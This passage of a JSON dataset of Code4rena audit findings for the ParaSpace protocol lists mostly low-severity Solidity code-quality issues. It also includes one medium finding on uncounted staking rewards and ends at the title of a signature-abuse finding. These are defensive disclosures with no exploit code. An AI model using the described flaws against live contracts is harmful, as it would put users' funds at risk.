      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25762",
      "title": "[N-24]  Duplicated `require()`/`revert()` checks should be refactored to a modifier or function",
      "impact": "LOW",
      "content": "The compiler will inline the function, which will avoid `JUMP` instructions usually associated with functions.\n\n*There are 32 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25761",
      "title": "[N-23]  Not using the named return variables anywhere in the function is confusing",
      "impact": "LOW",
      "content": "Consider changing the variable to be an unnamed one.\n\n*There are 18 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25760",
      "title": "[N-22]  Variable names that consist of all capital letters should be reserved for `constant`/`immutable` variables",
      "impact": "LOW",
      "content": "If the variable needs to be different based on which class it comes from, a `view`/`pure` _function_ should be used instead (e.g. like [this](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/76eee35971c2541585e05cbf258510dda7b2fbc6/contracts/token/ERC20/extensions/draft-IERC20Permit.sol#L59)).\n\n*There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25759",
      "title": "[N-21]  Lines are too long",
      "impact": "LOW",
      "content": "Usually lines in source code are limited to [80](https://softwareengineering.stackexchange.com/questions/148677/why-is-80-characters-the-standard-limit-for-code-width) characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over [164](https://github.com/aizatto/character-length) characters, the lines below should be split when they reach that length.\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25758",
      "title": "[N-20]  Inconsistent spacing in comments",
      "impact": "LOW",
      "content": "Some lines use `// x` and some use `//x`. The instances below point out the usages that don't follow the majority, within each file.\n\n*There are 33 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25757",
      "title": "[N-19]  Use scientific notation (e.g. `1e18`) rather than exponentiation (e.g. `10**18`)",
      "impact": "LOW",
      "content": "While the compiler knows to optimize away the exponentiation, it's still better coding practice to use idioms that do not require compiler optimization, if they exist.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/misc/UniswapV3OracleWrapper.sol\n\n245:                      ((oracleData.token0Price * (10**18)) /\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/UniswapV3OracleWrapper.sol#L245\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25756",
      "title": "[N-18]  Expressions for constant values such as a call to `keccak256()`, should use `immutable` rather than `constant`",
      "impact": "LOW",
      "content": "While it **doesn't save any gas** because the compiler knows that developers often make this mistake, it's still best to use the right tool for the task at hand. There is a difference between `constant` variables and `immutable` variables, and they should each be used in their appropriate contexts. `constants` should be used for literal values written into the code, and `immutable` variables should be used for expressions, or values calculated in, or passed into the constructor.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/misc/NFTFloorOracle.sol\n\n70:       bytes32 public constant UPDATER_ROLE = keccak256(\"UPDATER_ROLE\");\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L70\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25755",
      "title": "[N-17]  Use a more recent version of solidity",
      "impact": "LOW",
      "content": "Use a solidity version of at least 0.8.13 to get the ability to use `using for` with a list of free functions.\n\n*There are 16 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25754",
      "title": "[N-16]  Use a more recent version of solidity",
      "impact": "LOW",
      "content": "Use a solidity version of at least 0.8.12 to get `string.concat()` to be used instead of `abi.encodePacked(<str>,<str>)`.\n\n*There are 4 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25753",
      "title": "[N-15]  Events that mark critical parameter changes should contain both the old and the new value",
      "impact": "LOW",
      "content": "This should especially be done if the new value is not required to be different from the old value.\n\n*There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25752",
      "title": "[N-14]  Use bit shifts in an imutable variable rather than long bit masks of a single bit, for readability",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/misc/UniswapV3OracleWrapper.sol\n\n21:       uint256 internal constant Q128 = 0x100000000000000000000000000000000;\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/UniswapV3OracleWrapper.sol#L21\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25751",
      "title": "[N-13]  Numeric values having to do with time should use time units for readability",
      "impact": "LOW",
      "content": "There are [units](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#time-units) for seconds, minutes, hours, days, and weeks, and since they're defined, they should be used.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/misc/NFTFloorOracle.sol\n\n/// @audit 1800\n12:   uint128 constant EXPIRATION_PERIOD = 1800;\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L12\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25750",
      "title": "[N-12]  `constant`s should be defined rather than using magic numbers",
      "impact": "LOW",
      "content": "Even [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals.\n\n*There are 16 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25749",
      "title": "[N-11]  `2**<n> - 1` should be re-written as `type(uint<n>).max`",
      "impact": "LOW",
      "content": "Earlier versions of solidity can use `uint<n>(-1)` instead. Expressions not including the `- 1` can often be re-written to accomodate the change (e.g. by using a `>` rather than a `>=`, which will also save some gas).\n\n*There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25748",
      "title": "[N-10]  `override` function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings",
      "impact": "LOW",
      "content": "\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25747",
      "title": "[N-09]  The `nonReentrant` `modifier` should occur before all other modifiers",
      "impact": "LOW",
      "content": "This is a best-practice to protect against reentrancy in other modifiers.\n\n*There are 25 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25746",
      "title": "[N-08]  Duplicate import statements",
      "impact": "LOW",
      "content": "\n*There are 9 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25745",
      "title": "[N-07]  Missing `initializer` modifier on constructor",
      "impact": "LOW",
      "content": "OpenZeppelin [recommends](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/5) that the `initializer` modifier be applied to constructors in order to avoid potential griefs, [social engineering](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/4), or exploits. Ensure that the modifier is applied to the implementation contract. If the default constructor is currently being used, it should be changed to be an explicit one with the modifier applied.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/misc/NFTFloorOracle.sol\n\n55:   contract NFTFloorOracle is Initializable, AccessControl, INFTFloorOracle {\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L55\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25744",
      "title": "[N-06]  Import declarations should import specific identifiers, rather than the whole file",
      "impact": "LOW",
      "content": "Using import declarations of the form `import {<identifier_name>} from \"some/file.sol\"` avoids polluting the symbol namespace making flattened files smaller, and speeds up compilation.\n\n*There are 20 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25743",
      "title": "[N-05]  Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions",
      "impact": "LOW",
      "content": "See [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/ui/WPunkGateway.sol\n\n19    contract WPunkGateway is\n20        ReentrancyGuard,\n21        IWPunkGateway,\n22        IERC721Receiver,\n23:       OwnableUpgradeable\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/ui/WPunkGateway.sol#L19-L23\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25742",
      "title": "[N-04]  Inconsistent safe transfer library used",
      "impact": "LOW",
      "content": "Most places in the code use `GPv2SafeERC20`, but this one uses `SafeERC20`. All areas should use the same libraries.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: /paraspace-core/contracts/protocol/libraries/logic/MarketplaceLogic.sol\n\n16:  import {SafeERC20} from \"../../../dependencies/openzeppelin/contracts/SafeERC20.sol\";\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/MarketplaceLogic.sol#L16\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25741",
      "title": "[N-03]  Functions that must be overridden should be virtual, with no body",
      "impact": "LOW",
      "content": "\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25740",
      "title": "[N-02]  Input addresse to `_safeTransferETH()` should be payable",
      "impact": "LOW",
      "content": "While it doesn't affect any contract operation, it adds a degree of type safety during compilation, and is done by ``OpenZeppelin``(https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/dependencies/openzeppelin/contracts/Address.sol#L60-L65).\n\n*There is 1 instance of this issue:*\n```solidity\nFile: /paraspace-core/contracts/protocol/tokenization/NTokenUniswapV3.sol\n\n144:     function _safeTransferETH(address to, uint256 value) internal {\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/NTokenUniswapV3.sol#L144\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25739",
      "title": "[N-01]  EIP-1967 storage slots should use the `eip1967.proxy` prefix",
      "impact": "LOW",
      "content": "Using the prefix makes it easier to confirm that you are following the standard, and not altering the behavior in some incompatible way.\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25738",
      "title": "[L-09]  NatSpec is incomplete",
      "impact": "LOW",
      "content": "\n*There are 39 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25737",
      "title": "[L-08]  Open TODOs",
      "impact": "LOW",
      "content": "Code architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment.\n\n*There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25736",
      "title": "[L-07]  Use `Ownable2Step` rather than `Ownable`",
      "impact": "LOW",
      "content": "[`Ownable2Step`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/3d7a93876a2e5e1d7fe29b5a0e96e222afdc4cfa/contracts/access/Ownable2Step.sol#L31-L56) and [`Ownable2StepUpgradeable`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/25aabd286e002a1526c345c8db259d57bdf0ad28/contracts/access/Ownable2StepUpgradeable.sol#L47-L63) prevent the contract ownership from mistakenly being transferred to an address that cannot handle it (e.g. due to a typo in the address), by requiring that the recipient of the owner permissions actively accept via a contract call of its own.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/ui/WPunkGateway.sol\n\n19    contract WPunkGateway is\n20        ReentrancyGuard,\n21        IWPunkGateway,\n22        IERC721Receiver,\n23:       OwnableUpgradeable\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/ui/WPunkGateway.sol#L19-L23\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25735",
      "title": "[L-06]  `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`",
      "impact": "LOW",
      "content": "Use `abi.encode()` instead which will pad items to 32 bytes, which will [prevent hash collisions](https://docs.soliditylang.org/en/v0.8.13/abi-spec.html#non-standard-packed-mode) (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). \"Unless there is a compelling reason, `abi.encode` should be preferred\". If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` [instead](https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity#answer-82739).\n\nIf all arguments are strings and or bytes, `bytes.concat()` should be used instead.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/protocol/libraries/logic/ValidationLogic.sol\n\n1115          bytes32 typeHash = keccak256(\n1116              abi.encodePacked(\n1117                  \"Credit(address token,uint256 amount,bytes orderId)\"\n1118              )\n1119:         );\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/ValidationLogic.sol#L1115-L1119\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25734",
      "title": "[L-05]  Empty `receive()`/`payable fallback()` function does not authenticate requests",
      "impact": "LOW",
      "content": "If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. `require(msg.sender == address(weth))`). Having no access control on the function means that someone may send Ether to the contract, and have no way to get anything back out, which is a loss of funds. If the concern is having to spend a small amount of gas to check the sender against an immutable address, the code should at least have a function to rescue unused Ether.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/protocol/tokenization/NTokenUniswapV3.sol\n\n149:      receive() external payable {}\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/NTokenUniswapV3.sol#L149\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25733",
      "title": "[L-04]  `tokenURI()` does not follow EIP-721",
      "impact": "LOW",
      "content": "The [EIP](https://eips.ethereum.org/EIPS/eip-721) states that `tokenURI()` \"Throws if `_tokenId` is not a valid NFT\", which the code below does not do. If the NFT has not yet been minted, `tokenURI()` should revert.\n\n*There are 2 instances of this issue. (For in-depth details on this and all further issues with multiple instances, please see the warden's [full report](https://github.com/code-423n4/2022-11-paraspace-findings/issues/404).)*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25732",
      "title": "[L-03]  Fallback oracle may break with future NFTs",
      "impact": "LOW",
      "content": "In order for the fallback oracle to fall back to the Bend DAO oracle, the NFT in question must say that it in fact `supportsInterface(0x80ac58cd)`. The EIP-721 standard says that the implementer MUST do this, and both Openzeppelin's and Solmate's impelemntations do, but in the future the ParaSpace protocol may want to support a token that does not. I believe this deserves low rather than non-critical, because the damage won't be known until one of the other oracles fail. The fallback oracle is supposed to be the last resort before the protocol is unable to price/liquidate anything, so if the issue isn't caught before then, things could get stuck at the worst possible time. I would suggest to `require()` that the NFT supports the NFT at the point where it's [added](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L278-L286), to avoid having to even think about this edge case in the future.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: /paraspace-core/contracts/misc/ParaSpaceFallbackOracle.sol\n\n35           try IERC165(asset).supportsInterface(INTERFACE_ID_ERC721) returns (\n36               bool supported\n37           ) {\n38               if (supported == true) {\n39                   return INFTOracle(BEND_DAO).getAssetPrice(asset);\n40               }\n41:          } catch {}\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/ParaSpaceFallbackOracle.sol#L35-L41\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25731",
      "title": "[L-02]  Wrong interest during leap years",
      "impact": "LOW",
      "content": "The `calculateLinearInterest()` function uses `SECONDS_PER_YEAR`, which is a constant, so the constant will have the wrong value during leap years. While the function is out of scope, it's eventually called by `PoolCore:getNormalizedIncome()`, which _is_ in scope.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: /paraspace-core/contracts/protocol/libraries/math/MathUtils.sol\n\n23       function calculateLinearInterest(uint256 rate, uint40 lastUpdateTimestamp)\n24           internal\n25           view\n26           returns (uint256)\n27       {\n28           //solium-disable-next-line\n29           uint256 result = rate *\n30               (block.timestamp - uint256(lastUpdateTimestamp));\n31           unchecked {\n32               result = result / SECONDS_PER_YEAR;\n33           }\n34   \n35           return WadRayMath.RAY + result;\n36:      }\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/math/MathUtils.sol#L23-L36\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25730",
      "title": "[L-01]  Misleading variable naming/documentation",
      "impact": "LOW",
      "content": "The `recieveEthAsWeth` argument, if true, will do what the comment says: convert WETH to ETH, even though the variable name says the opposite. There is no way to know which one is right, without reading the code, which will lead to problems for callers of the external version of the function, `decreaseUniswapV3Liquidity()`.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: /paraspace-core/contracts/protocol/tokenization/NTokenUniswapV3.sol\n\n41       /**\n42        * @notice A function that decreases the current liquidity.\n43        * @param tokenId The id of the erc721 token\n44        * @param liquidityDecrease The amount of liquidity to remove of LP\n45        * @param amount0Min The minimum amount to remove of token0\n46        * @param amount1Min The minimum amount to remove of token1\n47        * @param receiveEthAsWeth If convert weth to ETH\n48        * @return amount0 The amount received back in token0\n49        * @return amount1 The amount returned back in token1\n50        */\n51       function _decreaseLiquidity(\n52           address user,\n53           uint256 tokenId,\n54           uint128 liquidityDecrease,\n55           uint256 amount0Min,\n56           uint256 amount1Min,\n57           bool receiveEthAsWeth\n58:      ) internal returns (uint256 amount0, uint256 amount1) {\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/NTokenUniswapV3.sol#L41-L58\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25729",
      "title": "[M-19] Rewards are not accounted for properly in NTokenApeStaking contracts, limiting user's collateral",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/ApeStakingLogic.sol#L253>\n\nApeStakingLogic.sol implements the logic for staking ape coins through the NTokenApeStaking NFT.\n\n`getTokenIdStakingAmount()` is an important function which returns the entire stake amount mapping for a specific BAYC / MAYC NFT.\n\n    function getTokenIdStakingAmount(\n        uint256 poolId,\n        ApeCoinStaking _apeCoinStaking,\n        uint256 tokenId\n    ) public view returns (uint256) {\n        (uint256 apeStakedAmount, ) = _apeCoinStaking.nftPosition(\n            poolId,\n            tokenId\n        );\n        uint256 apeReward = _apeCoinStaking.pendingRewards(\n            poolId,\n            address(this),\n            tokenId\n        );\n        (uint256 bakcTokenId, bool isPaired) = _apeCoinStaking.mainToBakc(\n            poolId,\n            tokenId\n        );\n        if (isPaired) {\n            (uint256 bakcStakedAmount, ) = _apeCoinStaking.nftPosition(\n                BAKC_POOL_ID,\n                bakcTokenId\n            );\n            apeStakedAmount += bakcStakedAmount;\n        }\n        return apeStakedAmount + apeReward;\n    }\n\nWe can see that the total returned amount is the staked amount through the direct NFT, plus rewards for the direct NFT, plus the staked amount of the BAKC token paired to the direct NFT. However, the calculation does not include the pendingRewards for the BAKC staked amount, which accrues over time as well.\n\nAs a result, getTokenIdStakingAmount() returns a value lower than the correct user balance. This function is used in PTokenSApe.sol's balanceOf function, as this type of PToken is supposed to reflect the user's current balance in ape staking.\n\nWhen user unstakes their ape tokens through executeUnstakePositionAndRepay, they will receive their fair share of rewards.It will call ApeCoinStaking's \\_withdrawPairNft which will claim rewards also for BAKC tokens. However, because balanceOf() shows a lower value, the rewards not count as collateral for user's debt, which is a major issue for lending platforms.\n\n### Impact\n\nRewards are not accounted for properly in NTokenApeStaking contracts, limiting user's collateral.\n\n### Recommended Mitigation Steps\n\nBalance calculation should include pendingRewards from BAKC tokens if they exist.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the ApeStakingLogic.sol contracts, which are used to stake ape coins through the NTokenApeStaking NFT. The important function getTokenIdStakingAmount() returns the entire stake amount mapping for a specific BAYC / MAYC NFT, but the calculation does not include the pendingRewards for the BAKC staked amount, which accrues over time as well. As a result, getTokenIdStakingAmount() returns a value lower than the correct user balance. This function is used in PTokenSApe.sol's balanceOf function, which is supposed to reflect the user's current balance in ape staking. When user unstakes their ape tokens, they will receive their fair share of rewards, but because balanceOf() shows a lower value, the rewards do not count as collateral for user's debt.\n\nThe impact of this bug is that rewards are not accounted for properly in NTokenApeStaking contracts, limiting user's collateral. The recommended mitigation steps to fix this issue is to make sure that the balance calculation includes pendingRewards from BAKC tokens if they exist.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/481",
      "tags": [],
      "finders": [
        "Trust",
        "0x52",
        "ladboy233"
      ]
    },
    {
      "id": "25728",
      "title": "[M-17] Attacker can abuse victim's signature for marketplace bid to buy worthless item",
      "impact": "MEDIUM",
